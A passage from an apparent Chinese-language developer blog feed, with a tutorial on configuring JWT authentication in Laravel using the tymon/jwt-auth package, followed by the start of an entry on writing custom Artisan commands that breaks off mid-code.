href="https://github.com/tymondesigns/jwt-auth" target="_blank" rel="noopener">jwt-auth</a> 是 Laravel 和 lumen 下一个优秀 JWT 组件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require tymon/jwt-auth</span><br></pre></td></tr></table></figure><p>安装完成后，需要生成一个 JWT 的 secret，这个 secret 很重要，用于最后的签名，更换这个 secret 会导致之前生成的所有 token 无效。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan jwt:secret</span><br></pre></td></tr></table></figure><p>可以看到在 <code>.env</code> 文件中，增加了一行 <code>JWT_SECRET</code>。</p><p>发布配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan vendor:publish --provider="Tymon\JWTAuth\Providers\LaravelServiceProvider"</span><br></pre></td></tr></table></figure><p>会在<code>config</code> 目录下生成一个<code>jwt.php</code> 的配置文件。</p><p>修改 <code>config/auth.php</code>，将 <code>api guard</code> 的 <code>driver</code> 改为 <code>jwt</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认的 guard</span></span><br><span class="line"><span class="string">'defaults'</span> =&gt; [</span><br><span class="line">    <span class="string">'guard'</span> =&gt; <span class="string">'web'</span>,</span><br><span class="line">    <span class="string">'passwords'</span> =&gt; <span class="string">'users'</span>,</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义 guard</span></span><br><span class="line"><span class="string">'guards'</span> =&gt; [</span><br><span class="line">    <span class="string">'web'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'session'</span>,</span><br><span class="line">        <span class="string">'provider'</span> =&gt; <span class="string">'users'</span>,</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="string">'api'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'jwt'</span>,</span><br><span class="line">        <span class="string">'provider'</span> =&gt; <span class="string">'users'</span>,</span><br><span class="line">    ],</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// provider 的作用是指定认证所需的数据表或者模型，推荐使用 eloquent</span></span><br><span class="line"><span class="string">'providers'</span> =&gt; [</span><br><span class="line">    <span class="string">'users'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'eloquent'</span>,</span><br><span class="line">        <span class="string">'model'</span> =&gt; App\User::class,</span><br><span class="line">    ],</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 'users' =&gt; [</span></span><br><span class="line">    <span class="comment">//     'driver' =&gt; 'database',</span></span><br><span class="line">    <span class="comment">//     'table' =&gt; 'users',</span></span><br><span class="line">    <span class="comment">// ],</span></span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>如果你使用默认的 User 模型来生成 token，那么该模型需要继承 <code>Tymon\JWTAuth\Contracts\JWTSubject</code> 接口，并实现接口的两个方法 <code>getJWTIdentifier()</code> 和 <code>getJWTCustomClaims()</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Tymon</span>\<span class="title">JWTAuth</span>\<span class="title">Contracts</span>\<span class="title">JWTSubject</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Auth</span>\<span class="title">User</span> <span class="title">as</span> <span class="title">Authenticatable</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Authenticatable</span> <span class="keyword">implements</span> <span class="title">JWTSubject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getJWTIdentifier</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getKey();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getJWTCustomClaims</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getJWTIdentifier</code> 返回了 User 的 id（用于生成 Token），<code>getJWTCustomClaims</code> 是我们需要额外在 JWT 载荷中增加的自定义内容，这里返回空数组。</p><p>打开Tinker，尝试生成一个 token：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; $user = User::first();</span><br><span class="line">&gt;&gt;&gt; Auth::guard(<span class="string">'api'</span>)-&gt;login($user);</span><br><span class="line"></span><br><span class="line">=&gt; <span class="string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9hdWN0aW9uLnNtaHN3LmxvY2FsIiwiaWF0IjoxNjIyOTY2OTM3LCJleHAiOjE2MjMwNTMzMzcsIm5iZiI6MTYyMjk2NjkzNywianRpIjoibVJKY2wzVWlOMURTQWg2WSIsInN1YiI6MSwicHJ2IjoiMThiMDU4NmY1NWY5YjVhYzc3NmY3MjU3ZTNiODdkMzY2ZjZjNWM3MSJ9.bKFU2T2b-L_nF6uiwb6gZm76aGcWraZ0Bo9O6Xz5Tqw"</span></span><br></pre></td></tr></table></figure><p>除了上面介绍的这种基于用户实例，返回Token的方式，还有另外两种方式可以创建Token：</p><ol><li><p>基于账密参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$credentials = request([<span class="string">'email'</span>, <span class="string">'password'</span>]); </span><br><span class="line">$token = auth()-&gt;attempt($credentials)</span><br></pre></td></tr></table></figure></li><li><p>基于模型中的用户主键 id</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$token = auth()-&gt;tokenById(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li></ol><p>拿到Token 之后，有两种使用方法：</p><ol><li>加到 url 中：<code>?token=你的token</code></li><li>加到 authorization 或者 header 中，建议用后者，因为在 https 情况下更安全：<code>Authorization:Bearer 你的token</code></li></ol><p><code>jwt-auth</code> 有两个重要的参数，可以在 <code>.env</code> 中进行设置：</p><ul><li><code>JWT_TTL</code>：生成的 token 在多少分钟后过期，默认 60 分钟</li><li><code>JWT_REFRESH_TTL</code>：生成的 token，在多少分钟内，可以刷新获取一个新 token，默认 20160 分钟，即 14 天。</li></ul><p>这里解释一下这两个参数是怎么回事：</p><ul><li><code>token</code> 的过期时间是出于安全性考虑</li><li><code>token_refresh</code> 的过期时间是出于用户体验考虑</li></ul><p>出于安全性考虑，不会给用户下发永久有效的token，用户需要每隔一段时间来用过期的token 来跟服务器换取一个新的 token。</p><p>打个比方：</p><blockquote><p>你在食堂办理了一张饭卡，有效期是1个月，每个月初都要去食堂激活一次，以整明你还在学校念书。<br>如果超过3个月内都没有激活这张饭卡，则视为该名学生已经不在学校，如果3个月后这名学生回来食堂吃饭，需要重新办理饭卡</p></blockquote><p>同样的道理转换到token，只是这个激活步骤不需要用户真的去操作，这个是我们来做的，全程用户都是无感的（这个是后面的无痛刷新 token 的内容）。</p><h3 id="使用详解"><a href="#使用详解" class="headerlink" title="使用详解"></a>使用详解</h3><p>Token 拿到之后，如何应用到项目中呢？</p><p>需要配合 <code>auth:api</code> 中间件使用，你肯定会觉得奇怪，这个中间件好像没有在任何地方定义，怎么就能使用？</p><p>打开<code>app\Http\Kernel.php</code>，可以看到默认的路由中间件列表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $routeMiddleware = [</span><br><span class="line">    <span class="string">'auth'</span> =&gt; \Illuminate\Auth\Middleware\Authenticate::class,</span><br><span class="line">    <span class="string">'auth.basic'</span> =&gt; \Illuminate\Auth\Middleware\AuthenticateWithBasicAuth::class,</span><br><span class="line">    <span class="string">'bindings'</span> =&gt; \Illuminate\Routing\Middleware\SubstituteBindings::class,</span><br><span class="line">    <span class="string">'cache.headers'</span> =&gt; \Illuminate\Http\Middleware\SetCacheHeaders::class,</span><br><span class="line">    <span class="string">'can'</span> =&gt; \Illuminate\Auth\Middleware\Authorize::class,</span><br><span class="line">    <span class="string">'guest'</span> =&gt; \App\Http\Middleware\RedirectIfAuthenticated::class,</span><br><span class="line">    <span class="string">'signed'</span> =&gt; \Illuminate\Routing\Middleware\ValidateSignature::class,</span><br><span class="line">    <span class="string">'throttle'</span> =&gt; \Illuminate\Routing\Middleware\ThrottleRequests::class,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>可以发现 <code>auth</code> 就是第一个中间件的别名，但是 <code>auth:api</code> 又是哪里来的呢？</p><p><code>api</code> 是 <code>auth</code> 的路由参数，指定了要使用哪个看守器，这里指定使用 <code>api</code> 看守器，也就是 <code>auth.php</code> 中配置的 <code>api</code> 守卫：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'guards'</span> =&gt; [</span><br><span class="line">    <span class="string">'api'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'jwt'</span>,</span><br><span class="line">        <span class="string">'provider'</span> =&gt; <span class="string">'user'</span>,</span><br><span class="line">    ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>所以<code>auth:api</code> 并不是哪里自定义的别名中间件。</p><p>如果直接使用<code>auth</code> 中间件，相当于使用 <code>auth.php</code> 中指定的 <code>defaults</code> 看守器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 路由中使用</span></span><br><span class="line">Route::middleware(<span class="string">"auth.admin"</span>)-&gt;group(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制器中使用</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;middleware(<span class="string">'auth:api'</span>, [<span class="string">'except'</span> =&gt; [<span class="string">'login'</span>]]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尝试根据提供的凭证验证用户是否合法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">attempt</span><span class="params">(array $credentials = [], $remember = false)</span></span>;</span><br><span class="line"><span class="comment">// 一次性登录，不记录session or cookie</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">once</span><span class="params">(array $credentials = [])</span></span>;</span><br><span class="line"><span class="comment">// 登录用户，通常在验证成功后记录 session 和 cookie </span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(Authenticatable $user, $remember = false)</span></span>;</span><br><span class="line"><span class="comment">// 使用用户 id 登录</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginUsingId</span><span class="params">($id, $remember = false)</span></span>;</span><br><span class="line"><span class="comment">// 使用用户 ID 登录，但是不记录 session 和 cookie</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onceUsingId</span><span class="params">($id)</span></span>;</span><br><span class="line"><span class="comment">// 通过 cookie 中的 remember token 自动登录</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">viaRemember</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 登出</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断当前用户是否登录</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 判断当前用户是否是游客（未登录）</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">guest</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 获取当前认证的用户</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 获取当前认证用户的 id，严格来说不一定是 id，应该是上个模型中定义的唯一的字段名</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">id</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 根据提供的消息认证用户</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span><span class="params">(array $credentials = [])</span></span>;</span><br><span class="line"><span class="comment">// 设置当前用户</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setUser</span><span class="params">(Authenticatable $user)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/articles/10885/full-use-of-jwt" target="_blank" rel="noopener">JWT 完整使用详解</a></li><li><a href="https://learnku.com/articles/10889/detailed-implementation-of-jwt-extensions#35808e" target="_blank" rel="noopener">JWT 扩展具体实现详解</a></li><li><a href="https://jwt-auth.readthedocs.io/en/develop/quick-start/" target="_blank" rel="noopener">jwt-auth Quick start</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;通常后端在开发Api 应用时，会给客户端一个唯一Token 进行标示，获取Token 的方式有很多，这里以 JWT 为例，介绍其概念及使用方法。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Artisan 自定义命令</title>
    <link href="https://www.0x2beace.com/laravel-artisan-custom-commands/"/>
    <id>https://www.0x2beace.com/laravel-artisan-custom-commands/</id>
    <published>2021-06-05T01:39:06.000Z</published>
    <updated>2021-06-05T01:39:59.037Z</updated>
    
    <content type="html"><![CDATA[<p>Laravel 主要提供了三种实现命令行交互的工具：</p><ol><li>Artisan：内置一套命令行操作，并可以自定义进行扩展</li><li>Tinker：为应用提供了 REPL 或者交互的 shell</li><li>安装器：通常在项目初始化时用到</li></ol><p>本章的内容主要以 Artisan 命令为主。</p><a id="more"></a><h2 id="Artisan-基本命令"><a href="#Artisan-基本命令" class="headerlink" title="Artisan 基本命令"></a>Artisan 基本命令</h2><ul><li><code>help</code> 帮助命令，例如 <code>php artisan help commandName</code></li><li><code>clear-compiled</code> 删除 Laravel 的编译文件（就像一个内部缓存），当遇到一些奇怪的问题时，可以先尝试运行这个命令</li><li><code>down</code> 把应用切换到『维护模式』以解决错误、迁移或者其他运行方式。up 可以在『维护模式』里恢复应用</li><li><code>env</code> 显示当时Laravel 的运行环境，它等效于在应用中输入 <code>app()-&gt;environment()</code></li><li><code>migrate</code> 迁移数据库</li><li><code>optimize</code> 通过把重要的PHP 类缓存到 <code>bootstrap/cache/compile.php</code> 来优化应用</li><li><code>serve</code> 部署一个PHP 服务器到 <code>localhost:8000</code>（可以通过 –host 和 -port 自定义修改主机名和端口号）</li><li><code>tinker</code> 打开Tinker 的REPL</li></ul><h2 id="组合命令"><a href="#组合命令" class="headerlink" title="组合命令"></a>组合命令</h2><p>Laravel 内置了许多好用的组合命令。</p><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>为了更快地查阅，<code>config:cache</code> 会缓存所有的配置，<code>config:clear</code> 会清理缓存。</p><h3 id="db"><a href="#db" class="headerlink" title="db"></a>db</h3><p>如果已经配置了数据库的 <code>seeder</code>，便可以用 <code>db:seed</code> 命令，来填充数据库。</p><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p><code>key:generate</code> 会在 <code>.env</code> 文件中创建一个随机的应用加密密钥，用于对数据进行加密。</p><blockquote><p>注意：这个命令只需要运行一次，也就是初始环境时，如果再次运行，则会丢失原有的密钥。</p></blockquote><h3 id="make"><a href="#make" class="headerlink" title="make"></a>make</h3><ul><li><code>make:command</code>：创建一个新的 Artisan 命令</li><li><code>make:controller</code>：生成 Controller</li><li><code>make:request</code>：生成 Request</li><li><code>make:resource</code>：生成 Resource</li><li><code>make:exception</code>：生成 Exception</li><li><code>make:job</code>：创建延迟任务</li></ul><h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><ul><li><code>queue:listen</code>：开始监听一个队列</li><li><code>queue:table</code>：为数据库支持队列创建一个迁移</li><li><code>queque:flush</code>：刷新所有失败的队列任务</li></ul><h3 id="route"><a href="#route" class="headerlink" title="route"></a>route</h3><ul><li><code>route:list</code>：查看应用的每一个路由定义，包括每个路由器的方法、路径、名字、控制器/闭包动作和中间件。</li><li><code>route:cache</code>：缓存路由器的定义，以便更快地查阅</li><li><code>route:clear</code>：清理控制器</li></ul><h2 id="自定义Artisan-命令"><a href="#自定义Artisan-命令" class="headerlink" title="自定义Artisan 命令"></a>自定义Artisan 命令</h2><p>先来创建一个新的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:command yourCommand</span><br></pre></td></tr></table></figure><p>先来看一下Artisan 命令的默认架构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Console</span>\<span class="title">Commands</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Console</span>\<span class="title">Command</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yourCommand</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台命令名称和签名</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $signature = <span class="string">'command:name'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台命令描述</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $description = <span class="string">'Command description'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个新的命令实例</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 执行控制台命令</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>$signature</code>：用于定义命令签名，比如签名是 <code>command:name</code>，那么最终执行的命令应该是：<code>php artisan command:name</code></li><li><code>$description</code>：对于该命令的描述</li><li><code>handle()</code>：执行命令所需要做的事情</li></ul><p>在 <code>handle()</code> 中检索命令行参数和选项值：</p><ul><li><code>argument()</code>：返回一个包含所有参数的数组</li><li><code>option()</code>：返回一个包含所有选项的数组</li></ul><p>在 <code>handle()</code> 中获取用户输入：</p><ul><li><code>ask()</code>：提示用户输入文本</li><li><code>secret()</code>：提示用户输入文本，但是会用星号来隐藏输入内容</li><li><code>confirm()</code>：提示用户恢复 是/否，返回一个布尔值</li><li><code>choice()</code>：提示用户选择一个选项，如果用户没有选择，那么最后一个参数就会使用默认值</li></ul><h3 id="Code-generator"><a href="#Code-generator" class="headerlink" title="Code generator"></a>Code generator</h3><p>Laravel 默认为我们提供了，<code>make:controller</code> 这样的生成控制器的命令，那如果需要生成自定义的代码，又该如何做呢？</p><p>这里以 <code>Service</code> 为例，首先创建命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:command MakeService</span><br></pre></td></tr></table></figure><p>编辑<code>app/Console/Command/MakeService.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Console</span>\<span class="title">Commands</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Console</span>\<span class="title">GeneratorCommand</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generator Service</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Class MakeService</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Console\Commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeService</span> <span class="keyword">extends</span> <span class="title">GeneratorCommand</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name and signature of the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">'make:service'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The console command description.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $description = <span class="string">'Create a new custom service class'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The type of class being generated.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $type = <span class="string">'Service'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the stub file for the generator.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getStub</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__DIR__</span> . <span class="string">'/stubs/service.stub'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the default namespace for the class.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $rootNamespace</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span 